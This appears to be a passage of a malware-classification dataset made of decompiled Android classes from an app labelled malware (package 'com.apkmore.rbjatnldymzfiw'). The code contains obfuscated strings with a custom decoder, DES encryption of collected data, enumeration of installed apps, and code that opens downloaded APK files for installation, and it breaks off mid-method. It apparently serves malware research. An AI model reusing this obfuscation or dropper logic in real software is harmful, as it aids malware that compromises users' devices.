static final String J=d.a(""xÃªÃ„Ã®Ã�Ã¶y"");   public static final String K=d.a(""xÄŠÃ˜ÃºÄ“Ä„Ã¼ÃµÃ�Â¼Â¸y"");   public static final String L=d.a(""xÄ…Ã³Ã½ÄŽÄ€ÃœÃ²Ã–Ã¹Ã Ã¸Ã°Ã¥Â¢Ã�Ã‘Âµy"");   public static final String M=d.a(""xÄ�Ã»Ã°Ã½Ã³Ã­Ä’ÃšÃ’Â¬\u009eÃ‡ÃŠÃ‡y"");   public static final String N=d.a(""xÄ…Ã³Ã½ÄŽÄ€ÃœÃ²Ã–Ã¹Ä‡Ã¼Ã»Ã®Â¢Ã�Ã‘Âµy"");   public static final String O=d.a(""xÃ»Ã¦Ä„ÄƒÃ½Ä’Ã°Ã˜Ã²Ã ÄˆÂ½Ã†Ã‰Â y"");   public static final String P=d.a(""xÃ¡Ä€Ã¬Ã©Ã¸Ã­Ã½Ä‡ÃµÃ“Ã¡Ã’ÄŒy"");   public static final String Q=d.a(""xÃ�ÃžÃ°ÄŒÃ˜Ã·Ä’y"");   public static final String R=d.a(""xÃ»Ã®Ãªy"");   public static final String S=d.a(""xÄ€Ã³Ã¤Ã¬Ä�Ã¡y"");   public static final String T=d.a(""xÂ¢Ã­Ã¿Ä“ÃªÂ°Ã·Ã¯Ã¾Ã¿Ã€y"");   public static final String U=d.a(""xÄŠÂ¨Â°y"");   public static final String V=d.a(""xÃ´Ã½Ã¤Ã¾ÄƒÄ’Ã½ÃŠÃ·y"");   public static final String W=d.a(""xÃ®Ã©Ä…Ã¸y"");   public static final String X=d.a(""xÃ©ÄƒÄ�Ã�Ã²y"");   public static final String Y=d.a(""xÃ‰Â£Â·ÃŽÃ�Â¹Â¯Ã„Ã…Â¼y"");   public static final String Z=d.a(""xÃ©ÄŠÄ�Ã�Ã²y"");   public static final String aa=d.a(""xÃ‰Â£Â·ÃŽÃ�Â¹Â¯Ã…Â¾Âºy"");   public static final String ab=d.a(""xÂ¹Ã½Ä�Ã�Ã²y"");   public static final String ac=d.a(""xÄ‹Ã¸Ã˜Ã¹Ã¹Ã£y"");   public static final String ad=d.a(""xÃ¹Ã¸Ä‹Ã¯y"");   public static final String ae=d.a(""xÃ»ÄŠÃ°\u009cÂºy"");   public static final String af=d.a(""xÃªÃ©Â±y"");   public static final String ag=d.a(""xÃ¨Ä�Ã¾Ã”Ãµy"");   public static final String ah=d.a(""xÃ˜Ã·Ã¸Ã–Ã§y"");   public static final String ai=d.a(""xÃ—Ã­Ã’Ã§ÄˆÃ§y"");   public static final String aj=d.a(""xÃœÃ¶Ã¿Ä†Ã®Â°ÃºÃ·Ã°ÃŠÂ±Ã—Ã¬Ã’Ä�Ä‚Â¸Ã¶Ã°Ã§Ã«Ã€ÂµÃ»Ã»Ã¦Ã­Ã»Â¹ÃŸÃ¬ÄˆÃ˜Ã°ÃŠÂ¿Ã²Ã®Ã´ÃµÃ¯Ã�Ä�Ã˜Ã¯Ã–Ä�Ã‰Â©Ã­Ã°Ã²Ã°Ã½Ã¸Ã³Ä‚Ã®ÃµÄ„Â¹Ã§Â¯Ä‹Ã›Ã¸Ä�ÄŠÄ€Ã¢Ä‰Ã³Â·Ä„Ã½Ã�Ã²Ã™Ã†Â½ÃªÃ¼Ã°Ã®Ã­Ã·Ã¶Ä†Ã·Ã´Ã´Ã…Ä‚Ã�Ã¯Ä„\u009eÄ�Ä‹Ä‹ÂµÂ¡Ã´Ã¾ÃºÄŠÃºÃ‘Ã Ã¥ÄƒÄŒÃ·Â»Ã¶Ã°Ã¨Ã‚Ä‚Ä…Â»Ã½Ã¶Ä‰Ã®ÃžÃ¥Ä�Ã Ã®ÄŒÄ“ÂµÂ¡Ã´Ã¾ÃºÄŠÃºÃ‘Ã Ã¥ÄƒÄŒÃ·Â»Ã¸Â¯Ã±Ä‡Ã‚ÄŠÃ°Ã¦Ã¶Ã‚ÂªÃ�Ã²ÄˆÃŸÃ²Ä�Ä€Ã½ÃªÄ‚Ã¼Â¹Ä–Â¾Ã›Ã²\u009eÃ»Ä�Ã¹Ã¸Ã©Ã¥Ã¥ÄˆÃ¾Ä�Ã¼Â±Â¦Ã·ÃºÃŸÃ®Ä�Ã–ÃªÄ’ÄˆÃ¸Ã¯Ã‚Ä„Ã¸Ä‚Â¿Ã›Ã²\u009eÃ¿Ä•Ã¬Ã±Ã¬Â®Â¤ÃµÄ…Ä‚ÃºÃ®Ã©Ã·Ã¾Ã˜Ã±Ä†Â¢Ã¿ÄŒÄƒÂ·Ã®Ä†Â»ÃºÄ�ÄˆÃ“Ã±Ã¡Ä‰Ä†Ã·Ä€Â¬Â¢Ã¥Ä„Ä…Ã¾Ã·Ã¨Ã§ÄŠÃ³ÃžÃ°Ã‡Ã Ã¼Ä•ÄŽÃ»Ã¥Â¿Â®Â´Ã�Â»y"");   public static final String ak=d.a(""xÃŠÃ¤Ã¶Ã³ÃºÄ’Â¾ÂºÃ ÃŸÄ�Ä’ÃªÃ³Ã¥y"");   public static final String al=d.a(""xÄ€Ã¾Â·Â²Ã�y"");   public static final String am=d.a(""xÃ�Ã—Ã£ÄŠÃ¦Ã®Ä’y"");   public static final String an=d.a(""xÃ­Ã¦Ã®Ä�ÃŒÃŠÃ¨Ã¸Ã¼Ã¾y"");   public static final String ao=d.a(""xÃ�Ä‡Ã­Ã²ÄŠÄ‹ÃªÂ°Ã‡Â¼ÂºÂ¾Â¹Ã‘Ã®ÃžÄŠÃ¾Ã½ÃµÃ¢Ã®Ã©Ã�ÂµÃŸÃ¡ÃŽÃ‹Â¶Ã‚\u009dÂ²Ã“\u0093Ã Ä‡Ä�Ã­Ã°ÄŠÄ�ÂªÃ¬Ã¥\u008eÂ´\u009fÃŒÃ˜Â©Ã Ã²Ã«Ã¨Ã¹ÄƒÄ†Â½Â¹Â´Ã†Ã…\u008fÂ°Ã¦Â¸Ã�Â¾Ã¢Ã•Ã“Â³Â¿Â¸Ã�Â¿Â¢Â²Â£ÃŒÃ˜Â©ÂºÃŽÃ‡Ã˜Â´Ã˜ÃžÃ Â¥Â¸Ã„Âº\u009dÂ·ÃˆÂªÂ»Ã•ÃšÂ©Â¯Ã¡Ã“ÃžÂ¾Ã”ÂºÃ‘\u0091Ã�Ã‹Â¹ÂºÂ°Â¶Â¹Ã„Ã‹Ã€Ã�ÂµÃ�Â¶Â¸Â½Ã‡Ã¬\u0093ÃŒÃªÃ±Â©Â´Ã�Â¾Â¸Ã’Ã†\u009eÂµ\u009fÃŒÃŽÂ¾Â¾Â»Â¢Â²Ã¢ÃšÃ¦Â®ÃˆÃ’Ã¨ÂªÂ¢Â°Ã�Â¡Â¼ÃŽÃ–Â»ÂºÂ¼y"");   public static final String ap=d.a(""xÃ›Ã¢Ã·ÄŒÄ„Ã¬ÃµÃ¼Ã½Ã¸y"");   public static final String aq=d.a(""xÃ£Ã˜Ã®ÄŽÃŒÃŠÃ­Ã¼Ä„Ã¯y"");   public static final String ar=d.a(""xÄƒÃ·Ã¯y"");   public static final String as=d.a(""xÃ—Ã®Ä‘Ä‚Ã»ÃªÄƒÄ‚Ã³Ä�Ã¿y"");   public static final String at=d.a(""xÃ­Ã¯Ä„Ã¾y"");   public static final String au=d.a(""xÃœÃ«Ä…Ã˜Ã½Ä—Ä�Ã®y"");   public static final String av=d.a(""xÃ«ÃŸÃ²Ä„ÃœÃ¬Ã¿Ä“Ã²Ã°Ä�Â½Ä€ÄŒÃµ\u009cÃ ÃŸÃ¾Ä�Ã¸ÃµÃ¤Â°Ã´ÃµÃ¸Ã½Ã¯Ã¬Ã«ÃƒÃ«Ã¡Ã¥Ä€ÃœÃ¿Äƒy"");   public static final String aw=d.a(""xÃºÃ¿Ã¾Ã›Ã§y"");   public static final String ax=d.a(""xÃ¯Ã¯Ã°Ã¸Ã¹ÄƒÄ†ÃˆÂ´ÂµÃºÃ¹Ã¦Ã°Ä„Ã¢ÃªÄ‚Ä’Â¸Ã¥Ä‚Ä…Ã¸ÄŠÄ€Ã�Ã£y"");   public static final String ay=d.a(""xÂ»Â²Ã‹Ã¦Ã‚\u009cy"");   public static final String az=d.a(""xæ¯­åž—äº�é€•Â¡Â·ÃŒy"");   public static final String aA=d.a(""xäº�é€ƒå°¢æŠšy"");   public static final String aB=d.a(""xå°Žè¥‹å°¢æŠšy"");   public static final String aC=d.a(""xçª�é›ºé�ƒæ¡¾ï¾¡y"");   public static final String aD=d.a(""xæ›„y"");   public static final String aE=d.a(""xå’»y"");   public static final String aF=d.a(""xæ�ºè�žy"");   public static final String aG=d.a(""xå¼™ç–®é€…ä¾€y"");   public static final String aH=d.a(""xÄ’Ä•Ä�Ä„Ã¸ÃºÃ¼ÄŒÄ�ÄŠÄ†Ã½Ã¾ÄŽÄ‚Ã§ÃºÄ�Ã«Ä�Ä–Ä—Ä�Ã¹Ä‹y"");   public static final String aI=d.a(""xÄ�Ã²Ã‘Ã§Ã–ÄŽÄ†Ã¶Ã±Ã³ÃªÃ¥Ã³ÄˆÃ»Ã²ÃªÃ¨Ã·Ã¼y"");   public static final String aJ=d.a(""xÃŸÄ‰Ä”Ã¨Ã¯Ã¡Ã¥Ã¬Ã¹Ä‰Ã»Ã»ÃªÃ¹Ã¾Ã«ÃŽÃµÄ�Ã—Ã®Ä€Ä€Ã»y"");   public static final String aK=d.a(""xÃ›Ã‰Â»y"");   public static final String aL=d.a(""xÄ’Ã²Ã¥Ã¸Ã°Ã«Ä�Ã°Ã‘Ã±Ã–Ã»Ä‘Ã®y"");   public static final String aM=d.a(""xÃ½Ä‡ÃµÃ“Ã¡Ã’ÄŒÃ¼Ã¬Ã¾Ã¥Ã£Ã¸Ã¹Ã´Ä†Ã·Ã²Ã«y"");   public static final String aN=d.a(""xÄ‘ÃºÃ’Ã¤Ã“Ã»Ä�Ã¨Ã¯Ã²Ã§Ã¥ÄˆÃºÃ±Ã±Ã´Ã»Ä„Ã¾y"");   public static final String aO=d.a(""xÃ­ÃºÄŠÃºÂ©Â±Ã‡Ã•Â·ÄŒÄˆÃ·Ã¦ÃµÃ½Ä‚ÃŒÃ´ÃœÂ®Ã’Ã¾ÄŠÃ²ÃºÂ¯ÃµÃ§Ä‡ÃƒÃ³Ã±Ã¹Ã¯Ä…Ã¸y"");   public static final String aP=d.a(""xÃ³Ä‡Ä”Ã³Ã¶Ä�Ã¸Ã³Ä“Ã»Ã£Ã­y"");   public static final String aQ=d.a(""xÃ­Ã°ÄŠÃ¼Ã©Ä‘ÃºÃ’Ã¤Ã“Ã»Ä�Â·Ã°Ã¢y"");   public static final String aR=d.a(""xÃ°Ä‡Ã½Ã“Ã£Ã Ä‘Ä‹ÃµÃ»Ã§Ã¡Ã·Ã½Ã¹Ã·Ã°Ã¦Ã¸y"");   public static final String aS=d.a(""xÃ«ÃŸÃ²Ä†Ã”Ã¶Äƒy"");   public static final String aT=d.a(""xÃ“Ã±Ä�Ã¡Ã¹Ã¿Ä“Ã±y"");   public static final String aU=d.a(""xÄˆÃ”Ã¬Ä‰Ä†Ã®Ã¯Ã´Ã»Ã¯y"");   public static final String aV=d.a(""xÃ«Ã“Ã¸Ã½Ã¥Ã²Ä‚y"");   public static final String aW=d.a(""xÃ£ÃªÄŠÃ˜ÃªÄ‚ÄˆÃ­y"");   public static final String aX=d.a(""xÃ¼Ã¢Ä€ÄŒÄ‹Ã®Ã¯ÃºÄ‚Ã²y"");   public static final String aY=d.a(""xÃ¼Ã¢Ä€ÄŒÄ…Ã²Ã¯Ã¼Ä�Ã²y"");   public static final String aZ=d.a(""xÃ±Ã²Ãªy"");   public static final String ba=d.a(""xÃ«Ã’Ã¡ÄˆÃ”Ã½Ä†y"");   public static final String bb=d.a(""xÄˆÃ”Ã¬Ä‰Ä†Ã®Ã�Ã´Ã»Ã¯y"");   public static final String bc=d.a(""xÃ•ÃŠÃšy"");   public static final String bd=d.a(""xè±¹æ¥˜æ¶¾ç¿šç½ºé�½æ�®çŒ·æ‚”y"");   public static final String be=d.a(""xÃ’ÃŠÃ™y"");   public static final String bf=d.a(""xÃ®ÃžÃ¹Ä†ÃœÃ·Ä…y"");   public static final String bg=d.a(""xÄ„Ä…y"");   public static final String bh=d.a(""xÃ�ÃžÃ�Ã�Ã‡y"");   public static final String bi=d.a(""xÃ©ÃŽå��äº�å’‡ç–›y"");   public static final String bj=d.a(""xÃ½Ã˜Ã¯å�¹äº€å‘¸ç—†y"");   public static final String bk=d.a(""xÃ Ã›Ã‘Ã�Ã–Ã‰Â´Ã©Ã“Ã�Ã‘Ã‹Â¶Ã“ÂµÂ¢Ã¦Ã‚Ã�Â¾Ã¤Ã¡ÃŠÃ¦Ã¢Ã�y"");   public static final String bl=d.a(""xÂ¾Ã³Ã“Â¢Ä�Ã¡Ã½ÄƒÄ†Ã®Ã³Â³Ã¾Ã¼Ä‡Ã¾Ã�Ã±ÃªÂºÄˆÃ®Ä…Â Ã£Ã¹ÄˆÄ„Ã»Ã¼Ã¨Ã¸Ã»Ã·Ã”Ã°ÄŒ\u009fy"");   public static final String bm=d.a(""xÄ”Ä€Ã»Ã¤Ã»Ã¯Ã¼Ã†Ã‚\u009eÂ¯\u009aÃ†y"");   public static final String bn=d.a(""xÃ“Â½Ã–Ã�ÂºÃŽÃ°y"");   public static final String bo=d.a(""xÃ¢Ã£Â½Ã�\u0091Ã®ÃžÃ‹Ã˜Ã…Â¢Ã�ÃšÂµÃ—Ã¦ÃŽÃ™ÃªÃ�y"");   public static final String bp=d.a(""xÃœÃ”Ã¨Ã½Ã¥Ã®Ä�y"");   public static final String bq=d.a(""xÄ‘Ä„ÃµÃ¦Ã¶Ä‚ÂªÃˆÂ±Ã”Ã±Ã Ä‡y"");   public static final String br=d.a(""xÃ—Ã®ÄŠÄ„Ã½Ã¦Â³Ã´Ã¼Ä�Ã¾y"");   public static final String bs=d.a(""xÃ¨Ã¹Ä‚Ä€Ã½Ã¦Â³Ã´Ã³ÄŠÃ¶Ã’Ã®Ã¨ÄˆÄ‰Ã¸Ã³ÃŸÃµÃ­Ã¸ÃºÃ´Ã¯Ã·Â¦Ä‰Ã¯Ã£Â¢Ã¼Ã¢Ä€ÄŒÄ‹Ã®Ã¯ÃºÄ‚Ã²Ã›Ã�\u008eÃ¶Ã™Ã¿Ä�Ã®Â¬Ã¤Ã±Ã»Ä‚Ä…Ã³Ä‚Ã­ÃƒÃ•ÂªÃ�Ã°Ã¼\u0093Ã½Ä†Ä‘Ã®Ã¢Ã·Ã·Ã®Ã›Ã�y"");   public static final String bt=d.a(""xÂº\u008eÃµÃ’Ä†Ä’Ã®Ã¿Â¨Ã�Â°Ã“Ã�Ã‘ÂºÃ„Â²Ã•Â¶Â®Â«y"");   public static final String bu=d.a(""xÃœÃ·Ä‘Ä„Ã»ÃµÂ³Ã·Ã¸Ä’Ä€y"");   public static final String bv=d.a(""xÃ¹Ã»Ã¶Ã”Ã¥ÄŒ\u0093Ã½Ä†Ä‘Ã®Ã¢Ã·Ã·Ã®ÃŠÂ±Ã’Ã®Ã¨ÄˆÄ‰Ã®ÃºÃ§Ã¶Ã¬Â´Ã»Ä„Ã½Ã²Â¦Ã¼Ã³Ã›Ã§Ã¼Ã¢Ä€ÄŒÄ‹Ã¸Ã¨Ã²Ä�Ã³Ä‚Ã¶Ã�Ã Ã£ÂºÄ”Ã±Ã±Ã²Ã§Â¤Ã¸Ä„Ä‰Ã¼ÃµÃ§ÄŠÃ²Â¬Ã�y"");   public static final String bw=d.a(""xÃŸÃ¡y"");   public static final String bx=d.a(""xÃƒy"");   public static final String by=d.a(""xÄŠÄ‡y"");   public static final String bz=d.a(""xÂ¾ÂªÃ€y"");   public static final String bA=d.a(""xÂ¸Ã°Ã¯Ã¹Ã²Ä€Ä„Ã³Ã²Â´Â¿Ä€Â¹Ã¢Ã«Ã¼Ã˜Ã«Ã¿Ä‘Â¸Â²Ã�Â¾Â¸Ã�Ã€y"");   public static final String bB=d.a(""xÃ—Ã¶ÄŒÃ£ÃƒÃ�ÃŽÃ²Ã®ÃºÂ¼Ã¸Ä‡Ã¿Ã“Ã¡Ã Ä’Ã‹Ã¬ÃºÂ¯Ã¦Ã¥ÄˆÃ„Ã´Â½Â¶Â´Ã†Â¸Â£Â±Ã‰Â¥Â·Ä‚Ä€Ã½y"");   public static final String bC=d.a(""xÃ‘Ã«Ã¿ÃƒÃ¸Ä‡Ä�Ã¼y"");   public static final String bD=d.a(""xÄŽy"");   public static final String bE=d.a(""xÃ•Ä�Ä‚ÃªÃµÃ¼Ã½Ã¸Ã²ÄŠÃžÃ¤y"");   public static final String bF=d.a(""xÃ´Ã´Ä„Ã«ÃªÄ€Ã‘Ã Ã¥ÄƒÄŒÃ·Ã Ã¹Ã²Ã©y"");   public static final String bG=d.a(""xÃ¢Ã£ÄŽÃ˜Ã�Ä—Ä�Ã®y"");   public static final String bH=d.a(""xÃ¹Ã¿Ä†Ã¯y"");   public static final String bI=d.a(""xÃ¹Ã¯ÄƒÃ¯y"");   public static final String bJ=d.a(""xy"");   public static final String bK=d.a(""xÃ¶Ã¹ÃºÄ†Ã„\u009eÂ±Ä�Ã¡Â·ÄŒÄˆÃ·Ã¦ÃµÃ½Ä‚ÃŒÃ´ÃœÂ®Ã¦ÄˆÄ†Ã·Ã¿Ã´Ã£Ã°Ä€ÃƒÃºÄ‚Ã²Ã²y"");   public static final String bL=d.a(""xÄ‡Ã¼y"");   public static final String bM=d.a(""xÄ‚Ã‹y"");   public static final String bN=d.a(""xÃ”y"");   public static final String bO=d.a(""xÂ»y"");   public static final String bP=d.a(""xÄƒÃ·Ã²y"");   public static final String bQ=d.a(""xÄ“Ä�Ã²Ã¯Ä†Ä‚Ã«ÄŠÃ½Ã�Ã´Ã£Ä†y""); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.c\c.code","public class c {   public static String a(  String str,  String str2){     SecretKeyFactory secretKeyFactory;     Cipher cipher=null;     StringBuffer stringBuffer=new StringBuffer();     DESKeySpec dESKeySpec=new DESKeySpec(str.getBytes());     try {       secretKeyFactory=SecretKeyFactory.getInstance(b.be);       try {         cipher=Cipher.getInstance(b.be);       }  catch (      NoSuchAlgorithmException e) {       }     }  catch (    NoSuchAlgorithmException e2) {       secretKeyFactory=null;     }     cipher.init(1,secretKeyFactory.generateSecret(dESKeySpec));     byte[] doFinal=cipher.doFinal(str2.getBytes());     for (    byte b : doFinal) {       String hexString=Integer.toHexString(b & 255);       if (hexString.length() == 1) {         stringBuffer.append(""0"" + hexString);       }  else {         stringBuffer.append(hexString);       }     }     return stringBuffer.toString().toUpperCase();   }   public static java.lang.String b(  java.lang.String r7,  java.lang.String r8){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.a.c.c.b(java.lang.String, java.lang.String):java.lang.String"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.c\d.code","public class d {   private static int[] f45a={148,149,146,142,133,134,150,138,111,TransportMediator.KEYCODE_MEDIA_RECORD,152,115,137,158,159,137,129,147,142,138,158,145,110,TransportMediator.KEYCODE_MEDIA_PAUSE,113,154,157,137,140,128,TransportMediator.KEYCODE_MEDIA_RECORD,132};   public static String a(  String str){     if (str == null || !str.startsWith(""x"") || !str.endsWith(""y"")) {       return """";     }     StringBuilder sb=new StringBuilder(str);     sb.deleteCharAt(0);     sb.deleteCharAt(sb.length() - 1);     char[] charArray=sb.toString().toCharArray();     StringBuilder sb2=new StringBuilder();     for (int i=0; i < charArray.length; i++) {       try {         a(sb2,(char)(charArray[i] - f45a[(charArray.length + i) % f45a.length]));       }  catch (      Exception e) {         e.printStackTrace();       }     }     return sb2.toString();   }   private static void a(  StringBuilder sb,  char c){     sb.append(c);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.c\e.code","public class e {   public static List b;   public static List f46a=new ArrayList();   private static e d=new e();   public static List c=new ArrayList();   private static int e=0;   public static e a(  Context context){     if (d == null) {       d=new e();     }     if (b == null) {       b(context);     }     return d;   }   public static String a(  String str){     if (str != null) {       return str.substring(str.lastIndexOf(""/"") + 1,str.length());     }     return null;   }   public static boolean a(  List list,  String str){     for (int i=0; i < list.size(); i++) {       if (((com.apkmore.rbjatnldymzfiw.a.b.b)list.get(i)).f.equals(str)) {         return false;       }     }     return true;   }   public static List b(  Context context){     String[] d2;     e=0;     c=new ArrayList();     b=new ArrayList();     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent(""android.intent.action.MAIN"",(Uri)null);     intent.addCategory(""android.intent.category.LAUNCHER"");     String n=h.n(context);     ArrayList arrayList=(n == null || n.equals("""")) ? new ArrayList() : h.e(n);     b=packageManager.queryIntentActivities(intent,1);     if (b != null) {       if (n != null && (d2=h.d(n)) != null) {         for (        String str : d2) {           if (h.b(str,context) && a(arrayList,str) && b(c,str)&& arrayList.size() + c.size() <= 20) {             c.add(str);           }         }       }       for (int i=0; i < b.size(); i++) {         String str2=(b.size() - i) + (-2) > 0 ? ((ResolveInfo)b.get((b.size() - i) - 2)).activityInfo.packageName : null;         if (!c.contains(str2) && str2 != null && a(arrayList,str2) && b(c,str2) && arrayList.size() + c.size() < 20 && e < 4) {           c.add(str2);           e++;         }       }     }     return b;   }   public static boolean b(  List list,  String str){     for (int i=0; i < list.size(); i++) {       if (((String)list.get(i)).equals(str)) {         return false;       }     }     return true;   }   public boolean a(  String str,  int i){     File[] listFiles=h.b(i).listFiles();     if (listFiles == null) {       return false;     }     for (    File file : listFiles) {       if (str.equals(file.getName().toString())) {         return true;       }     }     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.c\f.code","public class f {   private static Map f47a=new HashMap();   private static Map b=new HashMap();   private static int c;   public static android.graphics.Bitmap a(  android.content.Context r4,  java.lang.String r5){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.a.c.f.a(android.content.Context, java.lang.String):android.graphics.Bitmap"");   }   public static Drawable a(  Context context,  Bitmap bitmap){     if (c == 0) {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       c=displayMetrics.densityDpi;     }     BitmapDrawable bitmapDrawable=new BitmapDrawable(bitmap);     bitmapDrawable.setTargetDensity((int)(c * ((c * 1.0f) / 240.0f)));     return bitmapDrawable;   }   public static Drawable b(  Context context,  String str){     Drawable drawable;     if (b.containsKey(str) && (drawable=(Drawable)((SoftReference)b.get(str)).get()) != null) {       return drawable;     }     Bitmap a2=a(context,str);     if (a2 == null) {       return null;     }     Drawable a3=a(context,a2);     b.put(str,new SoftReference(a3));     return a3;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.c\g.code","public class g {   public static Map f48a=new HashMap();   public static Map b=new HashMap();   public static Map c=new HashMap();   public static final String d=Environment.getExternalStorageDirectory().toString();   public static final String e=d + ""/"" + b.G;   public static final String f=b.bf;   public static final String g=Environment.getExternalStorageDirectory() + b.bA;   public static final File h=new File(g);   public static final File i=new File(g,b.J);   public static boolean a(  Context context){     ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");     if (connectivityManager.getActiveNetworkInfo() != null) {       return connectivityManager.getActiveNetworkInfo().isAvailable();     }     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.c\h.code","public class h {   private static int f49a=0;   private static final Pattern b=Pattern.compile(b.af);   private static Object c=new Object();   public static Intent a(  Context context,  File file){     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),b.av);     return intent;   }   public static Intent a(  String str,  Context context){     Intent intent;     Exception e;     Intent intent2=new Intent();     try {       intent=context.getApplicationContext().getPackageManager().getLaunchIntentForPackage(str);     }  catch (    Exception e2) {       intent=intent2;       e=e2;     }     try {       intent.addFlags(268435456);       context.startActivity(intent);     }  catch (    Exception e3) {       e=e3;       e.printStackTrace();       return intent;     }     return intent;   }   public static PackageInfo a(  Context context,  String str,  int i){     return context.getPackageManager().getPackageInfo(str,i);   }   public static File a(  String str,  int i){     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return null;     }     String str2=b.G + i;     File file=new File(Environment.getExternalStorageDirectory(),str2);     if (!file.exists()) {       file.mkdirs();     }     return new File(Environment.getExternalStorageDirectory(),str2 + ""/"" + str);   }   public static Class a(  Context context,  Class cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=a(context,context.getApplicationInfo().packageName,1).activities;       if (activityInfoArr == null) {         return cls;       }       for (      ActivityInfo activityInfo : activityInfoArr) {         try {           cls2=Class.forName(activityInfo.name);         }  catch (        ClassNotFoundException e) {         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();       return cls;     }   }   public static String a(  double d,  double d2){     return null;   }   public static String a(  int i){     return g.e + i;   }   public static String a(  Context context,  PackageManager packageManager){     try {       String string=packageManager.getApplicationInfo(context.getPackageName(),128).metaData.getString(b.A);       return string == null ? b.bJ : string;     }  catch (    Exception e) {       return b.bJ;     }   }   public static String a(  com.apkmore.rbjatnldymzfiw.a.b.d dVar){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(dVar.a(),dVar.b());       return c.a(b.aP,jSONObject.toString());     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   protected static String a(  String str){     if (str == null || str.length() == 0) {       return str;     }     Matcher matcher=b.matcher(str);     ArrayList arrayList=new ArrayList();     while (matcher.find()) {       try {         arrayList.add(Integer.valueOf(matcher.group()));       }  catch (      Exception e) {         e.printStackTrace();         return str;       }     }     if (arrayList.size() <= 0) {       return str;     }     try {       byte[] bArr=new byte[arrayList.size()];       byte[] bytes=b.S.getBytes();       for (int i=0; i < bArr.length; i++) {         bArr[i]=(byte)(((Integer)arrayList.get(i)).intValue() - (bytes[i % bytes.length] & 255));       }       return new String(bArr,b.ae);     }  catch (    UnsupportedEncodingException e2) {       e2.printStackTrace();       return str;     }   }   public static void a(  int i,  Bitmap bitmap){     FileOutputStream fileOutputStream;     try {       fileOutputStream=new FileOutputStream(a(b.W + b.H,i));     }  catch (    FileNotFoundException e) {       e.printStackTrace();       fileOutputStream=null;     }     bitmap.compress(Bitmap.CompressFormat.PNG,100,fileOutputStream);     try {       fileOutputStream.flush();     }  catch (    IOException e2) {       e2.printStackTrace();     }     try {       fileOutputStream.close();     }  catch (    IOException e3) {       e3.printStackTrace();     }   }   public static void a(  long j,  Context context){     SharedPreferences.Editor edit=context.getSharedPreferences(b.aI,0).edit();     edit.putLong(b.aJ,j);     edit.commit();   }   public static void a(  Context context,  int i){     if (context == null) {       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(b.bE,0).edit();     edit.putInt(b.bF,i);     edit.commit();   }   public static void a(  Context context,  int i,  int i2){     if (context == null) {       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(b.bC,0).edit();     edit.putInt(b.bD,i2);     edit.commit();   }   public static void a(  Context context,  Intent intent){     String uri=intent.getData().toString();     String substring=uri.substring(8,uri.length());     SharedPreferences sharedPreferences=context.getSharedPreferences(b.aY,0);     String string=sharedPreferences.getString(substring,null);     if (string != null) {       String[] split=string.split("";"");       String str=split[0];       int intValue=Integer.valueOf(split[1]).intValue();       com.apkmore.rbjatnldymzfiw.a.i.a(context,R.drawable.ic_menu_agenda,b.aB,intValue,16,a(substring,context),split[2],-1);       e.c.add(substring);       sharedPreferences.edit().remove(substring).commit();       if (f(context) != null) {         m.a().a(context,intValue,3);       }  else {         a(context,"""" + intValue + "",3"");       }     }   }   private static void a(  android.content.Context r5,  java.io.File r6,  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.a.c.h.a(android.content.Context, java.io.File, java.lang.String):void"");   }   public static void a(  Context context,  String str){ synchronized (c) {       if (str == null) {         return;       }       SharedPreferences sharedPreferences=context.getSharedPreferences(b.D,0);       String string=sharedPreferences.getString(b.E,"""");       if (!string.equals("""")) {         str=string + "";"" + str;       }       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.putString(b.E,str);       edit.commit();     }   }   public static void a(  Context context,  boolean z){     if (z) {       new k(context);       k.a(2);     }   }   private static void a(  SharedPreferences sharedPreferences,  int i,  boolean z){     SharedPreferences.Editor edit=sharedPreferences.edit();     edit.putInt(b.aN,i);     if (z) {       edit.putLong(b.aM,System.currentTimeMillis());     }     edit.commit();   }   public static void a(  String str,  Context context,  int i){     if (b(i).exists()) {       File file=new File(a(i) + ""/"" + str);       if (file.exists()) {         file.delete();       }     }   }   public static void a(  String str,  Context context,  int i,  com.apkmore.rbjatnldymzfiw.a.b.b bVar){     File file=new File(a(i) + ""/"" + e.a(str));     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),b.av);     com.apkmore.rbjatnldymzfiw.a.i.a(context,R.drawable.stat_sys_download_done,b.aA,i,32,intent,bVar.d,-1);     context.startActivity(intent);   